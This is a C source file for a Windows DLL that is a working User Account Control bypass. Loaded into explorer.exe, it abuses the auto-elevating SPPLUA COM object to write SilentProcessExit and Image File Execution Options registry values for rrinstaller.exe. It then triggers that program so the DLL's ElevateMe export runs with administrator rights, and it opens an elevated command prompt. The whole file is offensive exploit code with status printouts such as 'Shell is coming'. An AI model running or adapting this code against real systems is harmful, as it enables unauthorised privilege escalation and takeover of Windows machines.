#include        "defs.h"

BOOL    SetRegistryValue(
  _In_ ISLLUAComInstance *pSLLUAComInstance,
  _In_             HKEY    hKey,
  _In_             LPWSTR  wsRegistryPath,
  _In_opt_         LPWSTR  wsValueName,
  _In_             DWORD   dwType,
  _In_             PVOID   lpData,
  _In_             DWORD   cbData){
        SAFEARRAY       *safeArray;
        BSTR            bsRegistryPath;
        BSTR            bsValueName;
        PVOID           lpBuffer;
        SSLUA_ROOTKEY   luaRootKey;
        HRESULT         hr;
        ISLLUAComInstanceWin7   *pSLLUAComInstanceWin7 = (ISLLUAComInstanceWin7 *)pSLLUAComInstance;
        
        RTL_OSVERSIONINFOEXW    osver;
        
        osver.dwOSVersionInfoSize = sizeof(osver);
        RtlGetVersion((PRTL_OSVERSIONINFOW)&osver);
        
        if (hKey == HKEY_CLASSES_ROOT){
                luaRootKey = SSLUA_HKEY_CLASSES_ROOT;
        }else if (hKey == HKEY_CURRENT_CONFIG){
                luaRootKey = SSLUA_HKEY_CURRENT_CONFIG;
        }else if (hKey == HKEY_LOCAL_MACHINE){
                luaRootKey = SSLUA_HKEY_LOCAL_MACHINE;
        }else if (hKey == HKEY_USERS){
                luaRootKey = SSLUA_HKEY_USERS;
        }else{
                return FALSE;
        }

        safeArray = SafeArrayCreateVector(VT_I1, 0, cbData);
        SafeArrayAccessData(safeArray, &lpBuffer);
        memcpy(lpBuffer, lpData, cbData);
        SafeArrayUnaccessData(safeArray);       
        
        bsRegistryPath = SysAllocString(wsRegistryPath);
        bsValueName    = SysAllocString(wsValueName);
        
        if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 1)
                hr = pSLLUAComInstanceWin7->lpVtbl->SLLUARegKeySetValue(pSLLUAComInstanceWin7,
                                                                    luaRootKey,
                                                                    bsRegistryPath,
                                                                    bsValueName,
                                                                    safeArray,
                                                                    dwType);
        else
                hr = pSLLUAComInstance->lpVtbl->SLLUARegKeySetValue(pSLLUAComInstance,
                                                                    luaRootKey,
                                                                    bsRegistryPath,
                                                                    bsValueName,
                                                                    safeArray,
                                                                    dwType);
        
        SysFreeString(bsRegistryPath);
        SysFreeString(bsValueName);
        SafeArrayDestroy(safeArray);
        return SUCCEEDED(hr);
}

VOID    CALLBACK        ElevateMe(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow){
        WCHAR           wsCommandLine[MAX_PATH];
        STARTUPINFO     sinfo;
        PROCESS_INFORMATION     pinfo;
        
        RegDeleteKey(HKEY_LOCAL_MACHINE, L"software\\microsoft\\windows nt\\currentversion\\image file execution options\\rrinstaller.exe");
        RegDeleteKey(HKEY_LOCAL_MACHINE, L"software\\microsoft\\windows nt\\currentversion\\silentprocessexit\\rrinstaller.exe");
        
        MessageBox(0, L"Elevated, here is your cmd.exe...", L"elevation ok", MB_TOPMOST);
        memset(wsCommandLine, 0, sizeof(wsCommandLine));
        GetSystemDirectory(wsCommandLine, MAX_PATH);
        wcsncat(wsCommandLine, L"\\cmd.exe", MAX_PATH);
        
        memset(&sinfo, 0, sizeof(sinfo));
        memset(&pinfo, 0, sizeof(pinfo));
        
        CreateProcess(NULL,
                      wsCommandLine,
                      0,
                      0,
                      0,
                      0,
                      0,
                      0,
                      &sinfo,
                      &pinfo);
        WaitForSingleObject(pinfo.hProcess, 0);             
        ExitProcess(0);                
}

HINSTANCE       g_hinstance;

DWORD   WINAPI DllMain(__in HINSTANCE hInstance, __in DWORD fdwReason, __in PVOID lpReserved);

DWORD   WINAPI  ElevateThread(__in PVOID lpArgument){
        return DllMain(g_hinstance, 0x1111, NULL);        
}

DWORD   WINAPI DllMain(__in HINSTANCE hInstance, __in DWORD fdwReason, __in PVOID lpReserved){
        HRESULT                 hr;
        ISLLUAComInstance      *pSLLUAComInstance = NULL;
        WCHAR           wsguid[MAX_PATH];
        WCHAR           wsElevUid[MAX_PATH];
        BIND_OPTS3      bo; 
        
        WCHAR           wsMonitorProcess[MAX_PATH];
        WCHAR           wsMonitorProcessCommandLine[MAX_PATH + MAX_PATH];
        WCHAR           wsSystemFolder[MAX_PATH];
        DWORD           dwReportingMode;
        DWORD           dwGlobalFlag;        
        BOOL            b_ret;
        WCHAR           wsrrinstaller[MAX_PATH];
        
        if (fdwReason == DLL_PROCESS_ATTACH){
                g_hinstance = hInstance;
                CloseHandle(CreateThread(NULL, 0, ElevateThread, NULL, 0, NULL));
                return TRUE;
        }
        
        if (fdwReason != 0x1111) return TRUE;
        
        memset(wsMonitorProcess, 0, sizeof(wsMonitorProcess));
        GetModuleBaseName(GetCurrentProcess(), NULL, wsMonitorProcess, sizeof(wsMonitorProcess));
        if (_wcsicmp(wsMonitorProcess, L"explorer.exe")) return TRUE; 
        
        memset(wsMonitorProcess, 0, sizeof(wsMonitorProcess));
        memset(wsMonitorProcessCommandLine, 0, sizeof(wsMonitorProcessCommandLine));
        memset(wsSystemFolder, 0, sizeof(wsSystemFolder));
        GetSystemDirectory(wsSystemFolder, MAX_PATH);
        GetModuleFileName(hInstance, wsMonitorProcess, MAX_PATH);
        _snwprintf(wsMonitorProcessCommandLine, MAX_PATH + MAX_PATH, L"%s\\rundll32.exe %s,ElevateMe", wsSystemFolder, wsMonitorProcess);
                
        CoInitialize(NULL); 
        memset(wsguid, 0, sizeof(wsguid));
        memset(wsElevUid, 0, sizeof(wsElevUid));
        StringFromGUID2((REFIID)&CLSID_SPPLUAObject, wsguid, sizeof(wsguid)/sizeof(WCHAR));
        _snwprintf(wsElevUid, MAX_PATH, L"Elevation:Administrator!new:%s", wsguid);
        
        memset(&bo, 0, sizeof(bo));
        bo.cbStruct       = sizeof(bo);
        bo.hwnd           = NULL;
        bo.dwClassContext = CLSCTX_LOCAL_SERVER;

        hr = CoGetObject(wsElevUid, (BIND_OPTS *)&bo, (const IID *)&IID_ISPPLUA, (IUnknown **)&pSLLUAComInstance);
        if (hr != S_OK) goto __Exit0;
        
        b_ret = SetRegistryValue(pSLLUAComInstance, 
                                 HKEY_LOCAL_MACHINE,
                                 L"software\\microsoft\\windows nt\\currentversion\\silentprocessexit\\rrinstaller.exe",
                                 L"MonitorProcess",
                                 REG_SZ,
                                 &wsMonitorProcessCommandLine,
                                 (ULONG)(wcslen(wsMonitorProcessCommandLine) * sizeof(WCHAR)));
                                 
        
        if (!b_ret){
                printf("[X] Failed to set SilentProcessExit MonitorProcess\n");
                goto __Exit0;
        }
        printf("[*] SilentProcessExit MonitorProcess set\n");
        
        dwReportingMode = 1;        
        b_ret = SetRegistryValue(pSLLUAComInstance,
                                 HKEY_LOCAL_MACHINE,
                                 L"software\\microsoft\\windows nt\\currentversion\\silentprocessexit\\rrinstaller.exe",
                                 L"ReportingMode",
                                 REG_DWORD,
                                 &dwReportingMode,
                                 sizeof(dwReportingMode));
        
        
        if (!b_ret){
                printf("[X] Failed to set SilentProcessExit ReportingMode\n");
                goto __Exit0;
        }
        printf("[*] SilentProcessExit ReportingMode set\n");
        
        dwGlobalFlag = 0x200;       
        b_ret = SetRegistryValue(pSLLUAComInstance,
                                 HKEY_LOCAL_MACHINE,
                                 L"software\\microsoft\\windows nt\\currentversion\\image file execution options\\rrinstaller.exe",
                                 L"GlobalFlag",
                                 REG_DWORD,
                                 &dwGlobalFlag,
                                 sizeof(dwGlobalFlag));
        
        if (!b_ret){
                printf("[X] Failed to set Image File Execution Options\n");
                goto __Exit0;
        }
        printf("[*] Image File Execution options set\n");
        
        b_ret = TRUE;
__Exit0:        
        SAFE_RELEASE(pSLLUAComInstance);                                                     
        
        if (!b_ret) ExitProcess(0);
                
        printf("[*] Shell is coming...\n");
        
        memset(wsrrinstaller, 0, sizeof(wsrrinstaller));
        GetSystemDirectory(wsrrinstaller, MAX_PATH);
        wcsncat(wsrrinstaller, L"\\rrinstaller.exe", MAX_PATH);
        ShellExecute(NULL, L"open", wsrrinstaller, NULL, NULL, SW_SHOW);
        ExitProcess(0);
}